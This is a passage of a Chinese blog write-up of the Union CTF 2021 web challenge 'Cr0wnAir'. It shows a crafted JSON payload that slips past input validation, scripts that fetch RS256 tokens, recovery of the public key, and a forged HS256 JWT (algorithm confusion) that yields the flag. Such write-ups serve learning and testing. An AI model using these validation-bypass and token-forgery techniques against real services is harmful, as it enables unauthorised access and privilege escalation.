Cr0wnAir frequent flyer. Your loyalty has been rewarded and you have been marked for an upgrade, please visit the upgrades portal.&quot;</span>, <span class="string">&quot;token&quot;</span>: token&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">var</span> response = &#123;<span class="attr">msg</span>: <span class="string">&quot;You have successfully checked in!&quot;</span>&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">var</span> response = &#123;<span class="attr">msg</span>: <span class="string">&quot;Invalid checkin data provided, please try again.&quot;</span>&#125;;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以發現在達成部分條件後可以拿到可用的 token。但是與此同時，這個條件是看似不可達的，因為有如下的驗證機制。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> pattern = &#123;</span><br><span class="line">  firstName: <span class="regexp">/^\w&#123;1,30&#125;$/</span>,</span><br><span class="line">  lastName: <span class="regexp">/^\w&#123;1,30&#125;$/</span>,</span><br><span class="line">  passport: <span class="regexp">/^[0-9]&#123;9&#125;$/</span>,</span><br><span class="line">  ffp: <span class="regexp">/^(|CA[0-9]&#123;8&#125;)$/</span>,</span><br><span class="line">  extras: [</span><br><span class="line">    &#123;<span class="attr">sssr</span>: <span class="regexp">/^(BULK|UMNR|VGML)$/</span>&#125;,</span><br><span class="line">  ],</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>可以發現此時的 FQTU 是不可能符合這個 pattern 的字串。此時就需要使用上面的漏洞來構造 payload。透過觀察可知這裡的 <code>extras</code> 是一個數組，先按照原有結構構造一下。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> data = &#123;</span><br><span class="line">	firstName: <span class="string">&quot;Lemon&quot;</span>,</span><br><span class="line">	lastName: <span class="string">&quot;Lemon&quot;</span>,</span><br><span class="line">	passport: <span class="string">&quot;123456789&quot;</span>,</span><br><span class="line">	ffp: <span class="string">&quot;CA12345678&quot;</span>,</span><br><span class="line">	extras: [</span><br><span class="line">		&#123;<span class="string">&quot;sssr&quot;</span>: <span class="string">&quot;FQTU&quot;</span>&#125;</span><br><span class="line">	]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>此時它是沒法透過檢查的，但是當它變成如下的樣子，就可以透過這個檢查了。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> data = &#123;</span><br><span class="line">	firstName: <span class="string">&quot;Lemon&quot;</span>,</span><br><span class="line">	lastName: <span class="string">&quot;Lemon&quot;</span>,</span><br><span class="line">	passport: <span class="string">&quot;123456789&quot;</span>,</span><br><span class="line">	ffp: <span class="string">&quot;CA12345678&quot;</span>,</span><br><span class="line">	extras: &#123;</span><br><span class="line">		<span class="string">&quot;e&quot;</span>: &#123;<span class="string">&quot;sssr&quot;</span>: <span class="string">&quot;FQTU&quot;</span>&#125;, </span><br><span class="line">		<span class="string">&quot;constructor&quot;</span>: &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;Array&quot;</span>&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>此時構造的這個 payload 符合了判斷中的所有條件，將其放到請求中傳送出去可以得到有效的 token。這裡寫個指令碼獲取一下。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> axios = <span class="built_in">require</span>(<span class="string">&quot;axios&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> data = &#123;</span><br><span class="line">	firstName: <span class="string">&quot;Lemon&quot;</span>,</span><br><span class="line">	lastName: <span class="string">&quot;Lemon&quot;</span>,</span><br><span class="line">	passport: <span class="string">&quot;123456789&quot;</span>,</span><br><span class="line">	ffp: <span class="string">&quot;CA12345678&quot;</span>,</span><br><span class="line">	extras: &#123;</span><br><span class="line">		<span class="string">&quot;e&quot;</span>: &#123;<span class="string">&quot;sssr&quot;</span>: <span class="string">&quot;FQTU&quot;</span>&#125;, </span><br><span class="line">		<span class="string">&quot;constructor&quot;</span>: &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;Array&quot;</span>&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">axios.post(<span class="string">&quot;http://34.105.202.19:3000/checkin&quot;</span>, data).then(<span class="function"><span class="params">res</span>=&gt;</span>&#123;</span><br><span class="line">	<span class="built_in">console</span>.log(res[<span class="string">&quot;data&quot;</span>][<span class="string">&quot;token&quot;</span>])</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
+
+<p>更換一下可變的引數後請求兩次可以得到如下兩個有效的 token。</p>
+<figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJicm9uemUiLCJmZnAiOiJDQTEyMzQ1Njc4In0.IQMSxgcZTmvVNJl51Xe71AtJI6vlINPb0GRy9GmxiLx6WsyFhSs-VXJh8G40TIYSD8LHfQGGxQVoK9Mnn8ImOz0Nv8BROkZ4fNiPEGXEIVaYNR2mzHc4_dARuciASyEdBapLrhlr7ln_EG6vKltB-KgsCfhJErVUOyvwfaZ0HdzJ6CQrS5-go33E7MpVe9LEsP7ySkbTdDxNsLmU64H2NqnWAxckQdEXlO2kMRWzsiCbvwOLY_hlEI2VwMuIqnFChI4McxBsCmel-mo7U6SEjfNyD7sEm3IglfGhW-RGsaR2xI4QuTsnjTRek51k2E-LC3W21AiWZ87jPbpwAXlCKg</span><br><span class="line"></span><br><span class="line">eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJicm9uemUiLCJmZnAiOiJDQTEyMzQ1Njc2In0.B86GaaGsm7i1sbszIdebYCzleDwLO6CI3ZaM21wl4-dkN0wAOz8Y3U5r8ukwrA8SV0Mtm23wsTFzaem5BTUbxtw949IUdweaZHJ1IrV1oJKxtY5XrFmim9Od6UrAmG9MhArEG6FRGsXzHbJkcP3cnMWiKPvt71U26VYpYeuZ2dmhufKGh_sYycFN1BZWWsfTK9cbXAw8dMSSFUlrmFxedA-uUkKw-n3Bged_fBBLzeB55WYKa_bX99l1I5S7F4hh4GaU44_thXeQA7VmxNIvRFusKdg7z7zcf3MA981JB1Pjgb2jMQdS7ktMyrP6VhZrJMcQ2EWKv65MpzCj-fB-Ag</span><br></pre></td></tr></table></figure>
+
+<p>使用上面提到的 rsa_sig2n 工具可以得到如下公鑰。</p>
+<figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">-----BEGIN PUBLIC KEY-----</span><br><span class="line">MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAw5lfZkrAzBjl2uf2bF4q</span><br><span class="line">uWzPbmEzcsjVGwEePrj3tQh2gQWMw7HOvNNqVMWbuyK0VYWyk&#x2F;EJ2IXkrV+R7yz1</span><br><span class="line">ROFf2gMH6MRcdVakQF0MQJVRGOmwAIxi+Y7X3fo8HsjJVzzEk4Xy+nWTGS&#x2F;FuNSW</span><br><span class="line">+n0ch81nlZykurVcDKTS7zxPjOtkOswfypoqZyEJ8Uyn32VgWcZ1IK4CB1m9Za0j</span><br><span class="line">DLU30ohyT3e3GUWT+qkUSiaHtMTViq8CxSMzlfFC1ASmAT1wGE+&#x2F;rcUtTPvVKmh0</span><br><span class="line">fTO2sqEsCQp2MGzKk8K1IhwdvuaXqgOFGIcBbaqMwKjpXIfTJSIb7rwEy&#x2F;i3N9y8</span><br><span class="line">CwIDAQAB</span><br><span class="line">-----END PUBLIC KEY-----</span><br></pre></td></tr></table></figure>
+
+<p>至此成功拿到了題目編碼 JWT 所用的公鑰。繼續審計程式碼，可以在 upgrades.js 下發現如下程式碼。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">router.post(<span class="string">&#x27;/flag&#x27;</span>, [getLoyaltyStatus], <span class="function"><span class="keyword">function</span>(<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (res.locals.token &amp;&amp; res.locals.token.status == <span class="string">&quot;gold&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> response = &#123;<span class="attr">msg</span>: config.flag &#125;;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">var</span> response = &#123;<span class="attr">msg</span>: <span class="string">&quot;You do not qualify for this upgrade at this time. Please fly with us more.&quot;</span>&#125;;</span><br><span class="line">  &#125;</span><br><span class="line">  res.json(response);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+
+<p>此時只需要偽造一段 JWT 使其 status 滿足要求即可。這裡使用舊版的包 <code>pyjwt==0.4.3</code> 去生成一個 HS256 演算法的 token。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line">key = <span class="built_in">open</span>(<span class="string">&quot;c3995f664ac0cc18_65537_x509.pem&quot;</span>).read()</span><br><span class="line">token = jwt.encode(&#123;<span class="string">&quot;status&quot;</span>: <span class="string">&quot;gold&quot;</span>&#125;, key, <span class="string">&quot;HS256&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(token)</span><br></pre></td></tr></table></figure>
+
+<p>再用 axios 去請求，可得到 flag。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> axios = <span class="built_in">require</span>(<span class="string">&quot;axios&quot;</span>)</span><br><span class="line"></span><br><span class="line">axios(&#123;</span><br><span class="line">	method: <span class="string">&quot;post&quot;</span>,</span><br><span class="line">	url: <span class="string">&quot;http://34.105.202.19:3000/upgrades/flag&quot;</span>,</span><br><span class="line">	headers: &#123;</span><br><span class="line">		<span class="string">&quot;Authorization&quot;</span>: <span class="string">&quot;Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdGF0dXMiOiJnb2xkIn0.aMSl9yfOJoNV3Xzd0vZqhTRgxNrII_iXt6k5w6P1g3E&quot;</span></span><br><span class="line">	&#125;&#125;).then(<span class="function">(<span class="params">res</span>) =&gt;</span> &#123;</span><br><span class="line">	<span class="built_in">console</span>.log(res[<span class="string">&quot;data&quot;</span>])</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union&#123;I_&lt;3_JS0N_4nD_th1ngs_wr4pp3d_in_JS0N&#125;</span><br></pre></td></tr></table></figure>
+
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">首頁</a></li>
+         
+          <li><a href="/archives/">文章</a></li>
+         
+          <li><a href="/writeups/">WriteUps</a></li>
+         
+          <li><a href="/tools/">工具</a></li>
+         
+          <li><a href="/about/">關於</a></li>
+         
+          <li><a href="/search/">搜尋</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Misc"><span class="toc-number">1.</span> <span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%91%91-Welcome-%F0%9F%91%91"><span class="toc-number">1.1.</span> <span class="toc-text">👑 Welcome 👑</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#bashlex"><span class="toc-number">1.2.</span> <span class="toc-text">bashlex</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web"><span class="toc-number">2.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Meet-the-Union-Committee"><span class="toc-number">2.1.</span> <span class="toc-text">Meet the Union Committee</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Cr0wnAir"><span class="toc-number">2.2.</span> <span class="toc-text">Cr0wnAir</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://lemonprefect.cn/zh-TW/posts/17a1c7f0.html"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://lemonprefect.cn/zh-TW/posts/17a1c7f0.html&text=Union CTF 2021"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://lemonprefect.cn/zh-TW/posts/17a1c7f0.html&title=Union CTF 2021"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://lemonprefect.cn/zh-TW/posts/17a1c7f0.html&is_video=false&description=Union CTF 2021"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Union CTF 2021&body=Check out this article: https://lemonprefect.cn/zh-TW/posts/17a1c7f0.html"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://lemonprefect.cn/zh-TW/posts/17a1c7f0.html&title=Union CTF 2021"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://lemonprefect.cn/zh-TW/posts/17a1c7f0.html&title=Union CTF 2021"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://lemonprefect.cn/zh-TW/posts/17a1c7f0.html&title=Union CTF 2021"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://lemonprefect.cn/zh-TW/posts/17a1c7f0.html&title=Union CTF 2021"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://lemonprefect.cn/zh-TW/posts/17a1c7f0.html&name=Union CTF 2021&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://lemonprefect.cn/zh-TW/posts/17a1c7f0.html&t=Union CTF 2021"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 選單</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 文章目錄</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 頁首</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/zh-TW/">首頁</a></li>
+         
+          <li><a href="/zh-TW/archives/">文章</a></li>
+         
+          <li><a href="/writeups/">WriteUps</a></li>
+         
+          <li><a href="/tools/">工具</a></li>
+         
+          <li><a href="/about/">關於</a></li>
+         
+          <li><a href="/search/">搜尋</a></li>
+        
+        
+        
+        <li>
+        
+          <a href="/zh-CN">简</a>
+        
+          <a href="/en">En</a>
+        
+          <a href="#">正</a>
+        
+        </li>
+      </ul>
+    </nav>
+  </div>
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2018-2021
+    LemonPrefect
+    湘ICP备20002800号
+    
+      <img src="/images/beian.png"/>
+      湘公网安备43021102000188号
+    
+    
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
